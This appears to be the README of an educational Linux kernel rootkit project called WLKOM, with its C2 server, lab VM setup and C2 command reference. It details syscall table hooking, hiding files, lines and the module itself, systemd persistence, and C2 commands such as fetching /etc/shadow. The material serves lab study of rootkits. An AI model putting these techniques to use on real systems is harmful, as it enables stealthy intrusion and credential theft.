# WLKOM — Wild Linux Kernel Object Module

## What is this?

WLKOM is a pedagogical Linux rootkit split into two components:

- **Attacking program** (`attacking_program/`): a C2 (Command & Control) server running on the attacker VM. It listens for the rootkit to connect, authenticates it, then lets you send commands.
- **Rootkit** (`rootkit/`): a Linux kernel module (LKM) loaded on the victim VM. Once loaded, it contacts the C2 server and executes commands received from it.

---

## Architecture

```
Host (Arch Linux)
├── Attacker VM  ──── ens3 (NAT, SSH :2222) ────────────────────────────────┐
│                ──── ens4 (socket net, 192.168.100.10) ─────────────────┐  │
│                                                                         │  │
└── Victim VM    ──── ens3 (NAT, SSH :2223) ────────────────────────────┐│  │
                 ──── ens4 (socket net, 192.168.100.20) ────────────────┘│  │
                                                                          │  │
Host machine ─── port 2222 → Attacker SSH ───────────────────────────────┘  │
             ─── port 2223 → Victim SSH ─────────────────────────────────────┘

Rootkit (victim) → TCP 192.168.100.10:4444 → C2 server (attacker)
```

The two VMs communicate over a QEMU socket-based virtual network (no external network required). The attacker VM opens a socket that the victim VM connects to. This creates an isolated point-to-point link between the two VMs, simulating a real network without Internet exposure.

### Network protocol

Each packet on the C2 channel:

```
[1 byte  : opcode]
[4 bytes : payload length (big-endian)]
[N bytes : payload (XOR encrypted with a 32-byte key)]
```

| Opcode | Value | Direction       | Description                  |
|--------|-------|-----------------|------------------------------|
| AUTH   | 0x01  | both            | Authentication handshake     |
| EXEC   | 0x02  | C2→rootkit      | Execute a shell command      |
| UPLOAD | 0x03  | C2→rootkit      | Send a file to the victim    |
| DOWNLOAD | 0x04 | C2→rootkit    | Retrieve a file from victim  |
| HIDE_FILE | 0x05 | C2→rootkit  | Hide a file/dir from `ls`    |
| UNHIDE_FILE | 0x06 | C2→rootkit| Unhide a file/dir            |
| HIDE_LINE | 0x07 | C2→rootkit  | Hide lines in a file         |
| UNHIDE_LINE | 0x08 | C2→rootkit| Unhide lines in a file       |
| PING   | 0x09  | both            | Connectivity check           |
| PONG   | 0x0A  | rootkit→C2      | Ping response                |

---

## Why Debian? Why kernel 6.1?

### Distribution choice: Debian 12 (Bookworm)

Debian is used for both VMs because:

- Its packaging system installs `linux-headers` that exactly match the running kernel, which is required to build an out-of-tree kernel module.
- Its default kernel configuration does **not** enforce module signature verification (`CONFIG_MODULE_SIG_FORCE=n`), so an unsigned `.ko` can be loaded with `insmod`.
- It ships a **stable LTS kernel (6.1.x)**, which means the kernel ABI changes slowly enough for the rootkit to compile and run reliably.
- The preseed automation system (`d-i`) allows fully unattended installation, which is useful for this project's automated setup.

### Kernel version: 6.1 LTS

**Why not the most recent kernel (6.8+)?**

Several changes in recent kernels break parts of this rootkit:

1. **`kobject_del` for module hiding (kernel ≥ 6.4)**
   The code in `hide.c` calls `kobject_del(&THIS_MODULE->mkobj.kobj)` to remove the module from `/sys/module/`. Since kernel 6.4, the module `mkobj` lifetime and reference counting changed: calling `kobject_del` on it can trigger a kernel panic or a use-after-free. The code guards this with `#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0)`. On Debian 12 (kernel 6.1), the call works correctly.

2. **`kallsyms_lookup_name` via kprobe (kernel ≥ 5.7)**
   Since kernel 5.7, `kallsyms_lookup_name` is no longer exported to modules. The rootkit uses a kprobe to locate it at runtime. This works on 6.1. On very recent kernels with stricter kprobe restrictions or lockdown mode enabled (e.g., when Secure Boot is active), the kprobe can fail.

3. **Kernel Lockdown LSM (kernel ≥ 5.4, enforced when Secure Boot is on)**
   When `CONFIG_SECURITY_LOCKDOWN_LSM=y` and Secure Boot is active, the kernel refuses to load unsigned modules. Debian 12 supports Secure Boot but does **not** enforce module signature for third-party modules by default if Secure Boot is not active. If you are running the VM without UEFI Secure Boot (which is the case in our QEMU setup), this is not an issue.

4. **Syscall table write protection**
   The rootkit disables write protection via `write_cr0()`. This technique works on kernel 6.1. On newer kernels compiled with `CONFIG_X86_KERNEL_IBT` (Indirect Branch Tracking, enabled in some 6.x configs), writing to the syscall table may trigger additional protections. Debian 12's default kernel does not enable IBT.

**Summary:** Debian 12 (kernel 6.1 LTS) is the most recent kernel that satisfies all of:
- No enforced module signing
- `kobject_del` works for module hiding
- No IBT protection on syscall table
- kprobe-based `kallsyms_lookup_name` lookup works

---

## VM Setup — Why cloud-init instead of a traditional installer?

> On dit merci qui ? Merci Claude. 🤝
>
> The original setup used a Debian netinstall ISO with a preseed file — Debian's classic
> automated installation system. After a review, the whole approach was replaced with
> Debian cloud images + cloud-init. Here's why.

### Before vs. After

| | Before (preseed + netinstall) | After (cloud image + cloud-init) |
|---|---|---|
| **Base image** | ~400 MB netinstall ISO | ~300 MB pre-built cloud image |
| **Install step** | Yes — full Debian installer run | No — image is already installed |
| **Time to ready** | 10–20 min per VM | ~2 min per VM (first boot only) |
| **Config format** | Debian-specific preseed syntax | Standard YAML (`#cloud-config`) |
| **Extra tools needed** | `xorriso` (ISO rebuilding) | `genisoimage` (tiny seed ISO) |
| **Custom ISO to build** | Yes — xorriso rebuild for each VM | No — just a 3-file seed ISO |
| **Readable config** | Hard (preseed is verbose and cryptic) | Easy (YAML, self-documented) |

### How cloud-init works

Instead of running the Debian installer, we start from an image that Debian
publishes officially and that is already fully installed: `debian-12-genericcloud-amd64.qcow2`.

Each VM gets a **seed ISO** — a small virtual CD with three files:

```
seed_attacker.iso  (label: cidata)
├── user-data       ← YAML: user, password, packages, SSH config
├── meta-data       ← hostname and instance-id
└── network-config  ← static IP on the private interface (ens4)
```

On first boot, cloud-init detects the `cidata` drive, reads these files, and
configures the system: creates the user, installs packages, sets the IP.
On every subsequent boot, cloud-init sees it already ran and does nothing.

The seed ISO is generated by `setup_attacker.sh` / `setup_victim.sh` from
templates in `scripts/cloud-init/`, with placeholders substituted from `.env`.

### Disk: copy-on-write backing

Both VMs share the same downloaded base image as a **read-only backing file**:

```bash
qemu-img create -f qcow2 -b debian-12-cloud-base.qcow2 -F qcow2 attacker.qcow2 8G
```

`attacker.qcow2` only stores the differences from the base. The base is never
modified. This saves ~600 MB of disk space compared to two independent full copies.

---

## Prerequisites (host: Arch Linux)

The `setup_vms.sh` script handles dependency installation. You need:

- A CPU with Intel VT-x (`vmx`) or AMD-V (`svm`) — check with `grep -E 'vmx|svm' /proc/cpuinfo`
- An Internet connection (~300 MB for the Debian cloud image)
- ~5 GB of free disk space (2 × 8G qcow2, sparse on disk)
- A working display (QEMU opens GTK windows for the VMs)

**Do not run the script as root.**

---

## Quick start

```bash
# 1. Clone or unzip the project
cd wlkom-lapsus/

# 2. (Optional) Edit .env to customize IPs, ports, credentials
#    Defaults work out of the box.
cat .env

# 3. Run setup — installs deps, downloads cloud image, creates disks + seed ISOs
./setup_vms.sh

# 4. Start both VMs (attacker FIRST — it opens the socket)
./vms/start_attacker.sh   # Terminal 1
./vms/start_victim.sh     # Terminal 2
# Cloud-init configures each VM on first boot (~2 min). No install step needed.

# 5. Deploy everything (compiles + loads rootkit)
./vms/deploy.sh

# 6. Connect to the attacker VM and run the C2 server
ssh wlkom@localhost -p 2222
cd ~/attacking_program && ./wlkom_c2 4444
```

---

## Step-by-step guide

### Step 1 — Understand `.env`

All configuration lives in `.env` at the project root. Every script sources it automatically.

```bash
ATTACKER_IP=192.168.100.10   # IP of attacker VM on private network
VICTIM_IP=192.168.100.20     # IP of victim VM on private network
NET_IFACE_PRIVATE=ens4       # Private network interface name inside the VMs
DISK_SIZE=8G                 # Size of each VM disk
RAM=2048                     # RAM per VM (MB)
CPUS=2                       # vCPUs per VM
VM_USER=wlkom                # Username inside VMs
VM_PASS=wlkom1234            # Password inside VMs
CONTROL_PORT=4444            # Port the C2 server listens on
ATTACKER_SSH_PORT=2222       # Host port forwarded to attacker SSH
VICTIM_SSH_PORT=2223         # Host port forwarded to victim SSH
SOCKET_PORT=12345            # Host port for the VM-to-VM socket link
DEBIAN_CLOUD_URL=https://... # Debian 12 genericcloud image URL
```

Edit this file before running `setup_vms.sh` if you want different values.
Do not commit it to version control if you change credentials.

### Step 2 — Run `setup_vms.sh`

```bash
./setup_vms.sh
```

This script:
1. Checks KVM support on the CPU
2. Installs QEMU, `genisoimage`, and `wget` (via `pacman` or `apt`)
3. Adds your user to the `kvm` group (re-login required if just added)
4. Downloads the Debian 12 cloud base image (~300 MB)
5. Calls `setup_attacker.sh` — creates `attacker.qcow2` + `seed_attacker.iso`
6. Calls `setup_victim.sh` — creates `victim.qcow2` + `seed_victim.iso`
7. Copies launch scripts from `scripts/` to `vms/`

After this step, `vms/` contains:

```
vms/
├── debian-12-cloud-base.qcow2   (shared read-only base, never modified)
├── attacker.qcow2               (copy-on-write, backed by base)
├── victim.qcow2                 (copy-on-write, backed by base)
├── seed_attacker.iso            (cloud-init seed — configures attacker on first boot)
├── seed_victim.iso              (cloud-init seed — configures victim on first boot)
├── start_attacker.sh
├── start_victim.sh
└── deploy.sh
```

### Step 3 — Start the VMs

**Important:** start the Attacker VM first — it opens the socket that the Victim connects to.

```bash
# Terminal 1 — open first
./vms/start_attacker.sh

# Terminal 2 — open after attacker window appears
./vms/start_victim.sh
```

On **first boot**, cloud-init runs and configures the VM (~2 min): creates the
user, sets the password, installs packages, configures the static IP on `ens4`.
On subsequent boots, this is skipped instantly.

Each VM has two network interfaces:
- `ens3`: NAT — Internet access + SSH port-forward to host
- `ens4`: private socket network — static IP, used for rootkit ↔ C2 traffic

SSH access from the host (once cloud-init has finished):

```bash
ssh wlkom@localhost -p 2222   # Attacker VM
ssh wlkom@localhost -p 2223   # Victim VM
```

### Step 4 — Deploy

Once both VMs are up and SSH is reachable:

```bash
./vms/deploy.sh
```

This script:
1. Waits for SSH to be reachable on both VMs
2. Copies `attacking_program/` to the attacker VM and compiles it
3. Copies `rootkit/` to the victim VM, compiles the kernel module
4. Loads the module: `sudo insmod wlkom.ko c2_ip=192.168.100.10 c2_port=4444`
5. Installs persistence via a systemd service that reloads the module at boot
6. Removes build artifacts from the victim VM

### Step 5 — Use the C2

SSH into the attacker VM and launch the C2 server:

```bash
ssh wlkom@localhost -p 2222
cd ~/attacking_program
./wlkom_c2 4444
```

You will be prompted for a password:

```
Password: wlk0m_s3cr3t
```

The server starts listening. Within a few seconds (the rootkit retries every 5 seconds):

```
[2026-01-01 12:00:00] WLKOM C2 listening on port 4444
[2026-01-01 12:00:05] New connection from 192.168.100.20:xxxxx
[2026-01-01 12:00:05] Rootkit authenticated from 192.168.100.20:xxxxx
```

---

## C2 command reference

```
WLKOM C2 > help
```

| Command                       | Description                                   |
|-------------------------------|-----------------------------------------------|
| `ping`                        | Check if the rootkit is alive (PONG)          |
| `exec <cmd>`                  | Run a shell command on the victim             |
| `upload <local> <remote>`     | Send a file from your machine to the victim   |
| `download <remote> <local>`   | Retrieve a file from the victim               |
| `hide_file <name>`            | Hide a file or directory from `ls`/`readdir`  |
| `unhide_file <name>`          | Make a hidden file visible again              |
| `hide_line <file> <pattern>`  | Hide lines containing `pattern` in `file`     |
| `unhide_line <file> <pattern>`| Restore hidden lines                          |
| `exit`                        | Disconnect                                    |

### Examples

```
WLKOM C2 > exec whoami
root

WLKOM C2 > exec uname -r
6.1.0-28-amd64

WLKOM C2 > upload /tmp/payload.sh /tmp/payload.sh
Upload: OK

WLKOM C2 > download /etc/shadow ./shadow.txt
Downloaded 1234 bytes → ./shadow.txt

WLKOM C2 > hide_file wlkom.ko
Hide file request sent: wlkom.ko

WLKOM C2 > hide_line /etc/modules wlkom
hide_line request sent

WLKOM C2 > ping
PONG
```

---

## Rootkit features

### Connection and reconnection

The rootkit starts a kernel thread (`wlkom_c2`) on module load. The thread:
1. Attempts to connect to the C2 IP and port
2. If the connection fails, sleeps 5 seconds and retries indefinitely
3. On connection, sends a PING so the C2 gets an immediate visual alert
4. Runs an authentication handshake
5. Enters a packet receive loop

If the C2 disconnects, the thread reconnects automatically.

### Authentication

The C2 sends the real password to the rootkit over the encrypted channel. The rootkit compares it and replies `OK` or `FAIL`. The password is not hardcoded in the rootkit binary — it is sent by the C2 at connection time.

On the C2 side, the password is stored Caesar-shifted in the binary (`WLKOM_PASSWORD` in `server.h`) and decrypted at runtime before being sent. This prevents trivial `strings` extraction.

### Command execution

Shell commands are executed via `call_usermodehelper("/bin/sh", ["-c", cmd])`. Output is captured by redirecting stdout/stderr to a temp file (`/tmp/.wlkom_out`), reading it, and deleting it.

### File hiding (getdents64 hook)

The rootkit hooks `getdents64` (and `getdents` for 32-bit compat) in the syscall table. When a directory listing is requested, any entry whose name matches a name in the hidden-files list is removed from the result before returning to userspace. This makes `ls`, `find`, and similar tools blind to those files.

### Line hiding (read hook)

The rootkit hooks `read`. When a process reads a file, the kernel buffer is scanned for lines containing any registered pattern. Matching lines are removed in-place before the data reaches userspace. This is used to hide the rootkit's entries in `/etc/modules`, systemd service files, etc.

### Module hiding

On load, the rootkit calls `list_del_init(&THIS_MODULE->list)` to remove itself from the kernel's internal module list (shown by `lsmod` and `/proc/modules`). On kernel < 6.4, it also calls `kobject_del` to remove itself from `/sys/module/`.

### Persistence

The rootkit installs itself via a systemd service:

```
/etc/systemd/system/wlkom.service
/lib/modules/<kernel>/kernel/wlkom/wlkom.ko
```

Both paths are added to the file-hiding list so `ls` will not show them.

### Encryption

All payload data on the network is XOR-encrypted with a 32-byte key (`wlk0m_xor_k3y_32bytes_padding__`). Both the C2 server (`server.c`) and the rootkit (`connect.c`) use the same key. This prevents a passive observer (e.g., `tcpdump`) from reading commands and outputs in cleartext.

---

## Makefile targets

### `attacking_program/`

```bash
make          # Build wlkom_c2
make check    # Run tests (requires libcriterion)
make clean    # Remove build artifacts
```

### `rootkit/`

```bash
make          # Build wlkom.ko
make load     # insmod wlkom.ko with default IP/port
make unload   # rmmod wlkom
make clean    # Remove build artifacts
```

Override C2 address at build time:

```bash
make load C2_IP=192.168.100.10 C2_PORT=4444
```

---

## Security considerations disabled (and why)

| Security feature         | Status in this setup | Technical reason |
|--------------------------|----------------------|------------------|
| Module signature (MODSIG) | Disabled (Debian default) | Debian does not enforce `CONFIG_MODULE_SIG_FORCE` without Secure Boot. Enabling it would require signing `wlkom.ko` with a key enrolled in MOK, which is outside the scope of this project. |
| Secure Boot              | Disabled (QEMU default) | QEMU's `-machine type=pc` does not use UEFI by default. Secure Boot requires OVMF firmware (`-bios /usr/share/ovmf/x64/OVMF.fd`). With Secure Boot, unsigned modules are rejected. |
| Kernel lockdown LSM      | Not active (no Secure Boot) | Lockdown mode is automatically enabled when Secure Boot is active on Debian. Without Secure Boot it is not enforced. |
| KASLR                    | Active (no mitigation) | KASLR randomizes kernel text address but not symbol addresses in `/proc/kallsyms`. The rootkit finds `sys_call_table` via `kallsyms_lookup_name`, which bypasses KASLR. |

---

## Troubleshooting

**KVM not available**
```
grep -E 'vmx|svm' /proc/cpuinfo
```
If empty, check BIOS/UEFI for "Intel Virtualization Technology" or "AMD-V" setting.

**`kvm` group not effective after setup**
Log out and back in (or run `newgrp kvm`) after `setup_vms.sh` adds your user to the `kvm` group.

**Victim VM fails to start (socket refused)**
The victim connects to a socket opened by the attacker. Always start the attacker VM first.

**Rootkit does not appear in C2 after loading**
Check dmesg on the victim:
```bash
sudo dmesg | grep WLKOM
```
Common causes: wrong C2 IP, C2 server not started yet (the rootkit retries every 5 seconds).

**`make` fails on victim (missing kernel headers)**
```bash
sudo apt-get install -y linux-headers-$(uname -r)
```

**Module already loaded**
```bash
sudo rmmod wlkom
```

---

## File structure

```
wlkom-lapsus/
├── .env                     # Configuration (IPs, ports, credentials)
├── .gitignore
├── AUTHORS
├── README.md
├── setup_vms.sh             # Main setup script (run once on host)
├── attacking_program/
│   ├── Makefile
│   ├── include/
│   │   ├── server.h         # Packet protocol, opcodes, client struct
│   │   └── commands.h       # commands_loop declaration
│   ├── src/
│   │   ├── main.c           # Entry point, password prompt
│   │   ├── server.c         # TCP server, packet I/O, crypto, auth
│   │   └── commands.c       # Command dispatch (exec, upload, hide...)
│   └── tests/
│       ├── test_server.c
│       └── test_commands.c
├── rootkit/
│   ├── Makefile
│   ├── include/
│   │   ├── connect.h        # connect_init/exit, opcodes, password
│   │   ├── hide.h           # hide_init/exit, hide_file/line...
│   │   └── persist.h        # persist_init/exit
│   └── src/
│       ├── main.c           # Module init/exit, module params
│       ├── connect.c        # Kernel TCP client, packet loop, commands
│       ├── hide.c           # Syscall table hooks, getdents64, read
│       └── persist.c        # Systemd service install
├── setup_attacker.sh        # Creates attacker disk + seed ISO
├── setup_victim.sh          # Creates victim disk + seed ISO
└── scripts/
    ├── lib.sh               # Shared functions (logs, SSH helpers)
    ├── cloud-init/
    │   ├── attacker/
    │   │   ├── user-data        # YAML: user, packages, SSH
    │   │   ├── meta-data        # hostname + instance-id
    │   │   └── network-config   # static IP on ens4
    │   └── victim/
    │       ├── user-data
    │       ├── meta-data
    │       └── network-config
    ├── start_attacker.sh    # Launch attacker VM (attacker first — opens socket)
    ├── start_victim.sh      # Launch victim VM
    └── deploy.sh            # Compile + deploy + load rootkit
```
